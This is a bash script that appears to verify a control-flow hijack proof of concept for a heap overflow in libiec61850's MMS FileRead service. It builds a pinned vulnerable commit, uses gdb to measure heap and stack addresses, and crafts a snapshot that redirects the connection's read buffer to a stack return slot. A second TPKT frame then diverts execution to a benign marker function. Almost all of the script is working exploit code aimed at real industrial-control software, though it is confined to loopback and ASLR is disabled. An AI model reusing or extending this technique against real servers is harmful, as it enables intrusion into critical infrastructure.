#!/usr/bin/env bash
# Rung-4 control-flow diversion probe for CVE-2026-49035. Loopback only.
#   bash r4_control.sh <absolute-outdir>
#
# Phase A captures the live heap region the overflow will overwrite (so phase B
# can preserve unrelated server state) and measures this host's gdb addresses.
# Phase B stages that snapshot with three surgical patches through the pinned
# ObtainFile client, triggers FileRead with maxPduSize=1, and sends a second
# 12-byte TPKT frame. The patched CotpConnection->readBuffer points that frame
# at a live stack return-address slot, so the second frame's payload becomes a
# chosen code address. A benign LD_PRELOAD marker function at that address
# executes in the live server; its stderr line is the acceptance signal.
#
# Conditions, asserted at run time: pinned vulnerable commit a1396111, gdb with
# ASLR disabled, stock glibc, real fd, measured heap/stack/PIE addresses, marker
# injected by LD_PRELOAD. This is NOT an RCE, ASLR defeat or persistent control:
# the server faults after the marker returns.
set -uo pipefail
HERE=$(cd "$(dirname "$0")" && pwd)
OUT=${1:-"$HERE/r4-control-out"}
mkdir -p "$OUT"
cd "$HERE" || exit 2
OUT=$(cd "$OUT" && pwd)
cd "$HERE/src" || exit 2
sha256sum -c SHA256SUMS > "$OUT/pins.log" 2>&1 || exit 2
cd "$HERE" || exit 2

B="$OUT/build"
rm -rf "$B"
mkdir -p "$B" || exit 2
tar -xzf "$HERE/src/libiec61850-a1396111.tar.gz" -C "$B" || exit 2
tar -xzf "$HERE/src/libiec-security-poc-main.tar.gz" -C "$B" || exit 2
V=$(find "$B" -maxdepth 1 -type d -name 'libiec61850-a1396111*' | head -1)
P="$B/libiec-security-poc-main/CVE-2026-49035-mms-fileread-heap-rce"
[ -n "$V" ] && [ -f "$P/rce/exploit.py" ] && [ -f "$P/poc/raw/exploit_raw.py" ] || exit 2
cmake -S "$V" -B "$B/plain" -DCMAKE_BUILD_TYPE=Debug \
  -DCMAKE_C_FLAGS='-g -O0 -fno-omit-frame-pointer' > "$B/cmake.log" 2>&1 || exit 2
cmake --build "$B/plain" --target server_example_files -- -j4 >> "$B/cmake.log" 2>&1 || exit 2
SDIR="$B/plain/examples/server_example_files"
mkdir -p "$SDIR/vmd-filestore" || exit 2

cat > "$OUT/marker.c" <<'C'
#define _GNU_SOURCE
#include <unistd.h>
int r4_marker(int fd, const void *buf, unsigned long n)
{
    (void)fd; (void)buf;
    static const char m[] = "R4_MARKER_EXECUTED\n";
    ssize_t ignored = write(2, m, sizeof(m) - 1);
    (void)ignored;
    return (int)n;
}
C
gcc -shared -fPIC -O0 -g -o "$OUT/marker.so" "$OUT/marker.c" || exit 2
nm -D "$OUT/marker.so" | grep -q ' T r4_marker$' || exit 2

cat > "$OUT/stage.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("pinned", sys.argv[1])
m = importlib.util.module_from_spec(spec); spec.loader.exec_module(m)
data = open(sys.argv[3], "rb").read()
print("stage_return=" + str(m.stage_file("127.0.0.1", int(sys.argv[2]), data, "REMOTE.BIN")))
PY

# Raw pinned client with one added 12-byte TPKT frame after the FileRead send.
cp "$P/poc/raw/exploit_raw.py" "$OUT/exploit_two_msg.py" || exit 2
python3 - "$OUT/exploit_two_msg.py" <<'PY' || exit 2
import sys
path = sys.argv[1]
s = open(path).read()
needle = '        sock.sendall(file_read_frame)\n'
assert s.count(needle) == 1
add = needle + '''        # second, chosen 12-byte TPKT frame (marker address supplied below)
        import time
        time.sleep(3)
        second = bytes.fromhex('0300000c') + __import__('struct').pack('<Q', MARKER_ADDR)
        print(f"  [SEND] second TPKT frame {second.hex()}")
        sock.sendall(second)
        time.sleep(3)
'''
open(path, 'w').write(s.replace(needle, add))
PY

pass=0; fail=0
check() { if [ "$2" = 1 ]; then echo "PASS $1"; pass=$((pass+1));
          else echo "FAIL $1"; fail=$((fail+1)); fi; }
stop() { kill "$1" 2>/dev/null; wait "$1" 2>/dev/null; }
sha() { sha256sum "$1" | cut -d' ' -f1; }

AP=10320; AT=10321; BP=10322; BT=10323
rm -f "$SDIR/vmd-filestore/REMOTE.BIN"

# Phase A: capture the overflow-region snapshot and this host's live addresses.
python3 -c "open('$OUT/initial.bin','wb').write(bytes(i%256 for i in range(120000)))" || exit 2
( cd "$SDIR" && timeout 20 ./server_example_files "$AP" ) > "$OUT/a.stage.server.log" 2>&1 &
srv=$!
sleep 3
python3 "$OUT/stage.py" "$P/rce/exploit.py" "$AP" "$OUT/initial.bin" > "$OUT/a.stage.client.log" 2>&1
stop "$srv"
grep -q 'ObtainFile complete' "$OUT/a.stage.client.log"
check "A: pinned ObtainFile staged the initial payload" "$([ $? -eq 0 ] && echo 1 || echo 0)"
[ "$(sha "$SDIR/vmd-filestore/REMOTE.BIN")" = "$(sha "$OUT/initial.bin")" ]
check "A: staged file sha256 equals initial payload" "$([ $? -eq 0 ] && echo 1 || echo 0)"

BASE_RE='0x7ffff0010ae0'
cat > "$OUT/a.gdb" <<GDB
set pagination off
set confirm off
break mms_file_service.c:872
commands
silent
set \$base = response->buffer
printf "=== BASE=%p COTP=%p ===\\n", \$base, \$base+81648
dump binary memory $OUT/region-orig.bin \$base+19 \$base+19+120000
quit
end
break CotpConnection_readToTpktBuffer
commands
silent
printf "=== RETSLOT=%p ===\\n", \$rbp+8
continue
end
start
printf "=== MARKERADDR=%p ===\\n", &r4_marker
continue
GDB
( cd "$SDIR" && LD_PRELOAD="$OUT/marker.so" timeout 25 gdb -q -batch -x "$OUT/a.gdb" \
    --args ./server_example_files "$AT" > "$OUT/a.gdb.log" 2>&1 ) &
gdbpid=$!
sleep 5
python3 "$P/poc/raw/exploit_raw.py" 127.0.0.1 "$AT" REMOTE.BIN 1 > "$OUT/a.client.log" 2>&1
sleep 1
stop "$gdbpid"
grep -q "=== BASE=$BASE_RE COTP=0x7ffff00249d0 ===" "$OUT/a.gdb.log"
check "A: asserted live sendBuffer/CotpConnection addresses" "$([ $? -eq 0 ] && echo 1 || echo 0)"
BASE=$(grep -o '=== BASE=0x[0-9a-f]*' "$OUT/a.gdb.log" | head -1 | grep -o '0x[0-9a-f]*' | head -1)
RET=$(grep -o '=== RETSLOT=0x[0-9a-f]*' "$OUT/a.gdb.log" | head -1 | grep -o '0x[0-9a-f]*' | head -1)
MARKER=$(grep -o '=== MARKERADDR=0x[0-9a-f]*' "$OUT/a.gdb.log" | head -1 | grep -o '0x[0-9a-f]*' | head -1)
[ -s "$OUT/region-orig.bin" ] && [ "$(stat -c%s "$OUT/region-orig.bin")" = 120000 ] \
  && [ -n "$RET" ] && [ -n "$MARKER" ]
check "A: heap snapshot and measured return/marker addresses" "$([ $? -eq 0 ] && echo 1 || echo 0)"
[ "$BASE" = "$BASE_RE" ] || { echo "address drift: BASE=$BASE RET=$RET MARKER=$MARKER"; exit 2; }

# Phase B: snapshot plus three surgical patches: readBuffer -> fake ByteBuffer
# at base+105000, whose buffer is RETSLOT-4 and whose size/fill fields are valid.
cat > "$OUT/mkcontrol.py" <<'PY'
import struct, sys
base = int(sys.argv[1], 16); ret = int(sys.argv[2], 16)
p = bytearray(open(sys.argv[3], 'rb').read()); assert len(p) == 120000
def fi(addr): return addr - base - 19
def put(addr, fmt, val): p[fi(addr):fi(addr)+struct.calcsize(fmt)] = struct.pack(fmt, val)
cotp = base + 81648
f3 = base + 105000
put(cotp + 0x40, '<Q', f3)   # CotpConnection->readBuffer
put(f3, '<Q', ret - 4)       # fake ByteBuffer.buffer -> stack return slot
put(f3 + 8, '<i', 4096)      # maxSize
put(f3 + 12, '<i', 0)        # size
open(sys.argv[4], 'wb').write(p)
print('payload_sha256=' + __import__('hashlib').sha256(p).hexdigest())
PY
python3 "$OUT/mkcontrol.py" "$BASE" "$RET" "$OUT/region-orig.bin" "$OUT/control.bin" \
  > "$OUT/control.payload.log" || exit 2
HASH=$(grep -o 'payload_sha256=[0-9a-f]*' "$OUT/control.payload.log" | cut -d= -f2)

cp "$OUT/exploit_two_msg.py" "$OUT/exploit_control.py"
python3 - "$OUT/exploit_control.py" "$MARKER" <<'PY' || exit 2
import sys
p = sys.argv[1]
s = open(p).read().replace('MARKER_ADDR', sys.argv[2])
open(p, 'w').write(s)
PY
rm -f "$SDIR/vmd-filestore/REMOTE.BIN"
( cd "$SDIR" && timeout 20 ./server_example_files "$BP" ) > "$OUT/b.stage.server.log" 2>&1 &
srv=$!
sleep 3
python3 "$OUT/stage.py" "$P/rce/exploit.py" "$BP" "$OUT/control.bin" > "$OUT/b.stage.client.log" 2>&1
stop "$srv"
grep -q 'ObtainFile complete' "$OUT/b.stage.client.log"
check "B: pinned ObtainFile staged the crafted snapshot" "$([ $? -eq 0 ] && echo 1 || echo 0)"
[ "$(sha "$SDIR/vmd-filestore/REMOTE.BIN")" = "$(sha "$OUT/control.bin")" ]
check "B: staged file sha256 equals crafted payload" "$([ $? -eq 0 ] && echo 1 || echo 0)"
HASH=$(sha "$OUT/control.bin")

cat > "$OUT/b.gdb" <<GDB
set pagination off
set confirm off
break mms_file_service.c:872
commands
silent
printf "=== BASE=%p BUFPOS=%d CHUNK=%u ===\\n", response->buffer, bufPos, fileChunkSize
continue
end
break CotpConnection_readToTpktBuffer
commands
silent
printf "=== READBUF rb=%p buf=%p max=%d size=%d ret=%p ===\\n", self->readBuffer, self->readBuffer->buffer, self->readBuffer->maxSize, self->readBuffer->size, *(void**)(\$rbp+8)
continue
end
start
break *$MARKER
commands
silent
printf "=== MARKER HIT rip=%p ===\\n", \$rip
continue
end
continue
GDB
( cd "$SDIR" && LD_PRELOAD="$OUT/marker.so" timeout 30 gdb -q -batch -x "$OUT/b.gdb" \
    --args ./server_example_files "$BT" > "$OUT/b.gdb.log" 2>&1 ) &
gdbpid=$!
sleep 5
python3 "$OUT/exploit_control.py" 127.0.0.1 "$BT" REMOTE.BIN 1 > "$OUT/b.client.log" 2>&1
sleep 2
stop "$gdbpid"

grep -q "=== BASE=$BASE_RE BUFPOS=19 CHUNK=120000 ===" "$OUT/b.gdb.log"
check "B: asserted overflow parameters in live server" "$([ $? -eq 0 ] && echo 1 || echo 0)"
grep -q "=== READBUF rb=0x7ffff002a508 buf=$(python3 -c "print(hex($RET-4))") max=4096 size=0" "$OUT/b.gdb.log"
check "B: live readBuffer is the chosen stack return slot" "$([ $? -eq 0 ] && echo 1 || echo 0)"
grep -q "=== MARKER HIT rip=$MARKER ===" "$OUT/b.gdb.log"
check "B: RIP diverted to the chosen marker address" "$([ $? -eq 0 ] && echo 1 || echo 0)"
grep -q 'R4_MARKER_EXECUTED' "$OUT/b.gdb.log"
check "B: benign marker executed in the live server" "$([ $? -eq 0 ] && echo 1 || echo 0)"
grep -q 'second TPKT frame 0300000c' "$OUT/b.client.log"
check "B: second chosen frame sent over loopback" "$([ $? -eq 0 ] && echo 1 || echo 0)"
[ -n "$HASH" ]
check "B: payload digest recorded" "$([ $? -eq 0 ] && echo 1 || echo 0)"

echo "TOTAL PASS=$pass FAIL=$fail"
[ "$fail" -eq 0 ] && { echo "ALL CHECKS PASS rc 0"; exit 0; }
echo "SOME CHECKS FAILED rc 1"; exit 1
